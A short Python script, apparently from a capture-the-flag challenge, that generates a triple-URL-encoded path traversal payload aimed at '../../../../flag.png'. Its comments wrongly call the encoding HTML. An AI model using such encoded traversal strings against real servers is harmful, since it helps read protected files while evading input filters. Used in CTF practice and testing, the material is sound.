# Script to "generate" path traversal payloads


# PATH is the path you want to traverse
# SLASH is the '/' encoded in HTML
# DOT is the '.' encoded in HTML
PATH = "../../../../flag.png"
SLASH = "%25252F"
DOT = "%25252e"

print(PATH.replace("/", SLASH).replace(".", DOT))
